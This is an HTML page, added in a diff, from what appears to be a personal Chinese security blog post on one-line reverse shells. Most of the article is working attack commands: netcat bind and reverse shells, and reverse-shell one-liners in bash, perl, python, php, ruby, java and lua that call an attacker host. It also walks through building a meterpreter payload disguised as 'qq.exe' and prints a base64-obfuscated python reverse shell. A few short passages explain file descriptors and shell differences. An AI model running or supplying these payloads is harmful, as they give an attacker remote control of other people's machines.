@@ -1,0 +1,282 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>一句话弹反shell | h0ld1rs的随手记</title><meta name="author" content="h0ld1rs"><meta name="copyright" content="h0ld1rs"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="在内网中，我们无法访问到对方的公网ip，只能采用弹反的方式获取对方的shell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一句话弹反shell">
+<meta property="og:url" content="https://h0ld1rs.github.io/2021/03/20/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%BC%B9%E5%8F%8Dshell/index.html">
+<meta property="og:site_name" content="h0ld1rs的随手记">
+<meta property="og:description" content="在内网中，我们无法访问到对方的公网ip，只能采用弹反的方式获取对方的shell">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://h0ld1rs.github.io/img/%E5%9B%BE%E5%BA%93/24.jpg">
+<meta property="article:published_time" content="2021-03-20T03:57:27.000Z">
+<meta property="article:modified_time" content="2021-07-31T05:57:25.768Z">
+<meta property="article:author" content="h0ld1rs">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://h0ld1rs.github.io/img/%E5%9B%BE%E5%BA%93/24.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://h0ld1rs.github.io/2021/03/20/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%BC%B9%E5%8F%8Dshell/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="preconnect" href="//zz.bdstatic.com"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: true
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-07-31 13:57:25'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">96</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/%E5%9B%BE%E5%BA%93/24.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">h0ld1rs的随手记</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">一句话弹反shell</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-03-20T03:57:27.000Z" title="发表于 2021-03-20 11:57:27">2021-03-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-31T05:57:25.768Z" title="更新于 2021-07-31 13:57:25">2021-07-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%AC%94%E8%AE%B0/">笔记</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>6分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="为什么要反弹shell"><a href="#为什么要反弹shell" class="headerlink" title="为什么要反弹shell"></a>为什么要反弹shell</h1><p>如果我们处于内网，我们可以借助frp进行端口代理，但是目标主机处于内网你就没法正向代理了<br> 当然啦，如果目标是windows系统，/bin/bash换成cmd.exe绝对路径即可，当然这个cmd.exe可以是C:\Windows\System32\cmd.exe，亦可以是通过webshell上传的cmd.exe，实战的话后者更多一点。</p>
+<h1 id="nc连接"><a href="#nc连接" class="headerlink" title="nc连接"></a>nc连接</h1><p>netcat连接</p>
+<h2 id="开启本地监听"><a href="#开启本地监听" class="headerlink" title="开启本地监听"></a>开启本地监听</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 开启本地的8080端口监听，并将本地的bash发布出去</span></span><br><span class="line"> nc -lvp 8080 -t -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<h2 id="直连目标主机"><a href="#直连目标主机" class="headerlink" title="直连目标主机"></a>直连目标主机</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  192.168.xx.xx 8080</span><br></pre></td></tr></table></figure>
+
+<h2 id="正反代理"><a href="#正反代理" class="headerlink" title="正反代理"></a>正反代理</h2><p>正向代理:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 1988 -e /bin/bash   </span><br><span class="line">nc Rhost 1988                   //hacker</span><br></pre></td></tr></table></figure>
+
+<p>反向代理:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash Lhost 1988</span><br><span class="line">nc -lvvp 1988                   //hacker</span><br></pre></td></tr></table></figure>
+
+<h1 id="脚本连接"><a href="#脚本连接" class="headerlink" title="脚本连接"></a>脚本连接</h1><p>更多的情况下，目标靶机是不会给予nc的环境的，需要就地取材，就整理一下各个语言的反弹shell 的方式。</p>
+<p>经过实测，，<code>一句话木马提权好难的。。。</code></p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#bash版本：</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/<span class="number">10.0</span>.<span class="number">0.1</span>/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line">#perl版本:</span><br><span class="line">perl -e <span class="symbol">&#x27;use</span> Socket;$i=<span class="string">&quot;10.0.0.1&quot;</span>;$p=<span class="number">1234</span>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">&quot;tcp&quot;</span>));<span class="keyword">if</span>(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,<span class="string">&quot;&gt;&amp;S&quot;</span>);open(STDOUT,<span class="string">&quot;&gt;&amp;S&quot;</span>);open(STDERR,<span class="string">&quot;&gt;&amp;S&quot;</span>);exec(<span class="string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;</span><br><span class="line"></span><br><span class="line">#python版本：</span><br><span class="line">python -c <span class="symbol">&#x27;import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;10.0.0.1&quot;</span>,<span class="number">1234</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);&#x27;</span><br><span class="line"></span><br><span class="line">#php版本：</span><br><span class="line">php -r &#x27;$sock=fsockopen(<span class="string">&quot;10.0.0.1&quot;</span>,<span class="number">1234</span>);exec(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</span><br><span class="line"></span><br><span class="line">#ruby版本：</span><br><span class="line">ruby -rsocket -e<span class="symbol">&#x27;f</span>=TCPSocket.open(<span class="string">&quot;10.0.0.1&quot;</span>,<span class="number">1234</span>).to_i;exec sprintf(<span class="string">&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;</span>,f,f,f)&#x27;</span><br><span class="line"></span><br><span class="line">#nc版本：</span><br><span class="line">nc -e /bin/sh <span class="number">10.0</span>.<span class="number">0.1</span> <span class="number">1234</span></span><br><span class="line"></span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc <span class="number">10.0</span>.<span class="number">0.1</span> <span class="number">1234</span> &gt;/tmp/f</span><br><span class="line"></span><br><span class="line">nc x.x.x.x <span class="number">8888</span>|/bin/sh|nc x.x.x.x <span class="number">9999</span></span><br><span class="line"></span><br><span class="line">#java版本</span><br><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] <span class="keyword">as</span> <span class="built_in">String</span>[])</span><br><span class="line">p.waitFor()</span><br><span class="line"></span><br><span class="line">#lua</span><br><span class="line">lua -e <span class="string">&quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;10.0.0.1&#x27;,&#x27;1234&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>文章来源:<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/5b73a607e2ea">https://www.jianshu.com/p/5b73a607e2ea</a></p>
+<p>关于我个人比较疑惑的<code>&lt;&amp;3 &gt;&amp;3 2&gt;&amp;3</code>，这个是什么，按道理来说，应该是文件描述符</p>
+<blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 - stdin</span><br><span class="line">1 - stdout</span><br><span class="line">2 - stderr</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>查了一下资料，是这样的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/1.png"></p>
+<p>按我个人理解，就像是创建了一个新的匿名文件(标识3)，然后把输入输出都重定向到3，这样就可以实现在弹回来的shell里实现命令操作。</p>
+<blockquote>
+<p>这里再补充一下， /bin/sh, /bin/bash, /bin/dash的区别</p>
+<p>可以用命令行<code>cat /etc/shells</code>查看当前可用的shell种类</p>
+<p>目前常见的shell脚本中主要有以下两种方式：<br>(1) #!/bin/sh<br>(2) #!/bin/bash</p>
+<p>#! 指的是一种特殊的魔法数字，是指定一个文件类型的特殊标记，在这种情况下，指的就是一个可执行的脚本。在#! 之后接一个路径名称。</p>
+<p>/bin/sh相当于/bin/bash –posix，和bash有一定的区别，具体区别如下</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">source pcy.sh #pcy.sh并不存在</span><br><span class="line">echo hello</span><br></pre></td></tr></table></figure>
+
+<p>当执行的文件后</p>
+<p><code>#!/bin/sh</code>的情况下，source不成功，<strong>不会运行</strong>source后面的代码。</p>
+<p>在<code>#!/bin/bash</code>的情况下，虽然source不成功，但是还是运行了source后面的echo语句。</p>
+<p>特殊情况:<code>在</code>CentOS<code>里，/bin/sh是一个指向/bin/bash的符号链接: (只是在 CentOS 里哦)</code></p>
+<h1 id="bash直接反弹"><a href="#bash直接反弹" class="headerlink" title="bash直接反弹"></a>bash直接反弹</h1><p>一般采用的方法都是，<code>bash</code>结合<code>重定向</code>的方法</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.xx.xx/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>一句话shell的解释</p>
+<p>图片来自与<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/87017">https://www.anquanke.com/post/id/87017</a></p>
+<p><img src="https://p0.ssl.qhimg.com/t01eb18cc78117e5c93.png" alt="http://p6.qhimg.com/t013e425e5510c369cc.png"></p>
+<p>bash产生了一个交互环境与本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。</p>
+<h1 id="msf进行反弹"><a href="#msf进行反弹" class="headerlink" title="msf进行反弹"></a>msf进行反弹</h1><p>先进行搜索，</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads | grep &quot;windows/meterpreter/reverse_tcp&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/2.png"></p>
+<p>输入以下命令生成payload（我用的msf6，其他版本可能在细节上会有些许差别）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter_reverse_tcp lhost=xxxxxx lport=xxxxxx -f exe -o root/DestTop/qq.exe</span><br></pre></td></tr></table></figure>
+
+<p>其中 -f 是生成格式 (盲猜一波,format)</p>
+<p>将生成的qq.exe上传到靶机win7中，然后打开msfconsole</p>
+<p>使用攻击模块监听</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>
+
+<p>然后设置payload，使用<code>show options</code>查看需要填入的属性</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter_resverse_tcp </span><br></pre></td></tr></table></figure>
+
+<p>然后<code>show options</code></p>
+<p>发现只需要设置一个<code>LHost</code>,输入kali地址，然后<code>run</code>开始监听</p>
+<p>然后我们打开win7靶机的<code>qq.exe</code>文件</p>
+<blockquote>
+<p>小细节，我的msf6直接会进去 meterpreter,需要backgroundm回到后台，才可以。</p>
+</blockquote>
+<p>就能看到kali这边获得一个session，</p>
+<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/3.png"></p>
+<p>然后我们<code>sessions -l</code> (l–&gt;list)，就可以发现建立的会话</p>
+<p>输入<code>sessions -i 2</code> (-i—&gt;interactive 交互)</p>
+<p>然后我们输入<code>getuid</code>就可以查看用户的信息，输入<code>systeminfo</code>查看系统信息，</p>
+<p>最后输入<code>shell</code>即可获得shell</p>
+<p>这里会乱码，继续我们的<code>chcp 65001</code>就可以换回正常的UTF-8编码。</p>
+<p>不过这样子拿到的shell权限都很低，需要进行提权</p>
+<h2 id="msf查询其脚本"><a href="#msf查询其脚本" class="headerlink" title="msf查询其脚本"></a>msf查询其脚本</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads &#x27;cmd/unix/reverse&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="bash生成一句话"><a href="#bash生成一句话" class="headerlink" title="bash生成一句话"></a>bash生成一句话</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash lhost=1.1.1.1 lport=12345 R</span><br></pre></td></tr></table></figure>
+
+<h3 id="python生成一句话"><a href="#python生成一句话" class="headerlink" title="python生成一句话"></a>python生成一句话</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=xxxxx LPORT=xxx R</span><br></pre></td></tr></table></figure>
+
+<p>然后在靶机上运行生成的python代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;exec(&#x27;aW1wb3J0IHNvY2tldCAgICAgICAgLCBzdWJwcm9jZXNzICAgICAgICAsIG9zICAgICAgICA7ICBob3N0PSIxOTIuMTY4LjMxLjIwMCIgICAgICAgIDsgIHBvcnQ9MTIzNDUgICAgICAgIDsgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAgICAgLCBzb2NrZXQuU09DS19TVFJFQU0pICAgICAgICA7ICBzLmNvbm5lY3QoKGhvc3QgICAgICAgICwgcG9ydCkpICAgICAgICA7ICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgICwgMCkgICAgICAgIDsgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgLCAxKSAgICAgICAgOyAgb3MuZHVwMihzLmZpbGVubygpICAgICAgICAsIDIpICAgICAgICA7ICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik=&#x27;.decode(&#x27;base64&#x27;))&quot;</span></span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">h0ld1rs</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://h0ld1rs.github.io/2021/03/20/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%BC%B9%E5%8F%8Dshell/">https://h0ld1rs.github.io/2021/03/20/%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3/%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%BC%B9%E5%8F%8Dshell/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://h0ld1rs.github.io" target="_blank">h0ld1rs的随手记</a>！</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="/img/%E5%9B%BE%E5%BA%93/24.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/03/22/%E5%86%85%E7%BD%91%E7%9B%B8%E5%85%B3/linux-%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/"><img class="prev-cover" src="/img/%E5%9B%BE%E5%BA%93/29.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">linux_脏牛提权(CVE-2016-5159)</div></div></a></div><div class="next-post pull-right"><a href="/2021/03/19/%E9%9D%B6%E6%9C%BA/vulnhub-zico2/"><img class="next-cover" src="/img/%E5%9B%BE%E5%BA%93/30.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">vulnhub-zico2</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">h0ld1rs</div><div class="author-info__description">博主笨的离谱，希望各位佬们多包含</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">96</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">23</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/h0ld1rs"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/h0ld1rs/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:yumeibumei@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.</span> <span class="toc-text">为什么要反弹shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nc%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.</span> <span class="toc-text">nc连接</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E5%90%AF%E6%9C%AC%E5%9C%B0%E7%9B%91%E5%90%AC"><span class="toc-number">2.1.</span> <span class="toc-text">开启本地监听</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B4%E8%BF%9E%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA"><span class="toc-number">2.2.</span> <span class="toc-text">直连目标主机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%8F%8D%E4%BB%A3%E7%90%86"><span class="toc-number">2.3.</span> <span class="toc-text">正反代理</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E8%BF%9E%E6%8E%A5"><span class="toc-number">3.</span> <span class="toc-text">脚本连接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bash%E7%9B%B4%E6%8E%A5%E5%8F%8D%E5%BC%B9"><span class="toc-number">4.</span> <span class="toc-text">bash直接反弹</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#msf%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BC%B9"><span class="toc-number">5.</span> <span class="toc-text">msf进行反弹</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#msf%E6%9F%A5%E8%AF%A2%E5%85%B6%E8%84%9A%E6%9C%AC"><span class="toc-number">5.1.</span> <span class="toc-text">msf查询其脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bash%E7%94%9F%E6%88%90%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-number">5.1.1.</span> <span class="toc-text">bash生成一句话</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 